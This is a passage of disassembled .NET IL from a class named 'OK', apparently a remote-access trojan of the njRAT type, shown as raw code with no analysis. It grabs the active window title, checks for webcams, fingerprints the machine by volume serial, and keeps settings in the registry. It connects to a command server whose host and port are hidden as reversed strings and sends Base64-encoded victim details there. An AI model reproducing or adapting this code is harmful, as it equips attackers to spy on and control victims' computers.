    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       674 (0x2a2)
    .maxstack  4
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             string V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool j.OK::Cn
    IL_0006:  ldc.i4     0x7d0
    IL_000b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0010:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0015:  stloc.0
    IL_0016:  ldloc.0
    IL_0017:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_001c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0021:  brfalse.s  IL_004e

        .try
        {
          IL_0023:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0028:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_002d:  ldnull
          IL_002e:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0033:  leave.s    IL_004e

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0035:  dup
          IL_0036:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003b:  stloc.1
          IL_003c:  ldloc.1
          IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_004c:  leave.s    IL_004e

        }  // end handler
        IL_004e:  nop
        .try
        {
          IL_004f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_0054:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0059:  leave.s    IL_0074

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_005b:  dup
          IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0061:  stloc.2
          IL_0062:  ldloc.2
          IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0072:  leave.s    IL_0074

        }  // end handler
        IL_0074:  leave.s    IL_008f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0076:  dup
        IL_0077:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_007c:  stloc.3
        IL_007d:  ldloc.3
        IL_007e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008d:  leave.s    IL_008f

      }  // end handler
      IL_008f:  nop
      .try
      {
        IL_0090:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0095:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_009a:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_009f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a4:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a9:  ldc.i4     0x32000
        IL_00ae:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00b3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b8:  ldc.i4     0x32000
        IL_00bd:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00c2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00c7:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00cc:  ldc.i4     0x2710
        IL_00d1:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_00d6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00db:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00e0:  ldc.i4     0x2710
        IL_00e5:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_00ea:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00ef:  ldsfld     string j.OK::H
        IL_00f4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
        IL_00f9:  ldsfld     string j.OK::P
        IL_00fe:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
        IL_0103:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0108:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_010d:  ldc.i4.1
        IL_010e:  stsfld     bool j.OK::Cn
        IL_0113:  call       string j.OK::inf()
        IL_0118:  call       bool j.OK::Send(string)
        IL_011d:  pop
        .try
        {
          IL_011e:  ldstr      "vn"
          IL_0123:  ldstr      ""
          IL_0128:  call       object j.OK::GTV(string,
                                                object)
          IL_012d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0132:  ldstr      ""
          IL_0137:  ldc.i4.0
          IL_0138:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_013d:  brfalse.s  IL_0159

          IL_013f:  ldloc.s    V_4
          IL_0141:  ldsflda    string j.OK::VN
          IL_0146:  call       string j.OK::DEB(string&)
          IL_014b:  ldstr      "\r\n"
          IL_0150:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0155:  stloc.s    V_4
          IL_0157:  br.s       IL_0189

          IL_0159:  ldloc.s    V_4
          IL_015b:  ldstr      "vn"
          IL_0160:  ldstr      ""
          IL_0165:  call       object j.OK::GTV(string,
                                                object)
          IL_016a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_016f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0174:  stloc.s    V_5
          IL_0176:  ldloca.s   V_5
          IL_0178:  call       string j.OK::DEB(string&)
          IL_017d:  ldstr      "\r\n"
          IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0187:  stloc.s    V_4
          IL_0189:  ldc.i4.s   16
          IL_018b:  newarr     [mscorlib]System.String
          IL_0190:  dup
          IL_0191:  ldc.i4.0
          IL_0192:  ldloc.s    V_4
          IL_0194:  stelem.ref
          IL_0195:  dup
          IL_0196:  ldc.i4.1
          IL_0197:  ldsfld     string j.OK::H
          IL_019c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
          IL_01a1:  stelem.ref
          IL_01a2:  dup
          IL_01a3:  ldc.i4.2
          IL_01a4:  ldstr      ":"
          IL_01a9:  stelem.ref
          IL_01aa:  dup
          IL_01ab:  ldc.i4.3
          IL_01ac:  ldsfld     string j.OK::P
          IL_01b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
          IL_01b6:  stelem.ref
          IL_01b7:  dup
          IL_01b8:  ldc.i4.4
          IL_01b9:  ldstr      "\r\n"
          IL_01be:  stelem.ref
          IL_01bf:  dup
          IL_01c0:  ldc.i4.5
          IL_01c1:  ldsfld     string j.OK::DR
          IL_01c6:  stelem.ref
          IL_01c7:  dup
          IL_01c8:  ldc.i4.6
          IL_01c9:  ldstr      "\r\n"
          IL_01ce:  stelem.ref
          IL_01cf:  dup
          IL_01d0:  ldc.i4.7
          IL_01d1:  ldsfld     string j.OK::EXE
          IL_01d6:  stelem.ref
          IL_01d7:  dup
          IL_01d8:  ldc.i4.8
          IL_01d9:  ldstr      "\r\n"
          IL_01de:  stelem.ref
          IL_01df:  dup
          IL_01e0:  ldc.i4.s   9
          IL_01e2:  ldsfld     bool j.OK::Idr
          IL_01e7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01ec:  stelem.ref
          IL_01ed:  dup
          IL_01ee:  ldc.i4.s   10
          IL_01f0:  ldstr      "\r\n"
          IL_01f5:  stelem.ref
          IL_01f6:  dup
          IL_01f7:  ldc.i4.s   11
          IL_01f9:  ldsfld     bool j.OK::IsF
          IL_01fe:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0203:  stelem.ref
          IL_0204:  dup
          IL_0205:  ldc.i4.s   12
          IL_0207:  ldstr      "\r\n"
          IL_020c:  stelem.ref
          IL_020d:  dup
          IL_020e:  ldc.i4.s   13
          IL_0210:  ldsfld     bool j.OK::Isu
          IL_0215:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_021a:  stelem.ref
          IL_021b:  dup
          IL_021c:  ldc.i4.s   14
          IL_021e:  ldstr      "\r\n"
          IL_0223:  stelem.ref
          IL_0224:  dup
          IL_0225:  ldc.i4.s   15
          IL_0227:  ldsfld     bool j.OK::BD
          IL_022c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0231:  stelem.ref
          IL_0232:  call       string [mscorlib]System.String::Concat(string[])
          IL_0237:  stloc.s    V_4
          IL_0239:  ldstr      "inf"
          IL_023e:  ldsfld     string j.OK::Y
          IL_0243:  ldloca.s   V_4
          IL_0245:  call       string j.OK::ENB(string&)
          IL_024a:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_024f:  call       bool j.OK::Send(string)
          IL_0254:  pop
          IL_0255:  leave.s    IL_0272

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0257:  dup
          IL_0258:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_025d:  stloc.s    V_6
          IL_025f:  ldloc.s    V_6
          IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_026b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0270:  leave.s    IL_0272

        }  // end handler
        IL_0272:  leave.s    IL_029c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0274:  dup
        IL_0275:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_027a:  stloc.s    V_7
        IL_027c:  ldloc.s    V_7
        IL_027e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0283:  ldc.i4.0
        IL_0284:  stsfld     bool j.OK::Cn
        IL_0289:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_028e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0293:  leave.s    IL_029c

      }  // end handler
    }  // end .try
    finally
    {
      IL_0295:  ldloc.0
      IL_0296:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_029b:  endfinally
    }  // end handler
    IL_029c:  ldsfld     bool j.OK::Cn
    IL_02a1:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
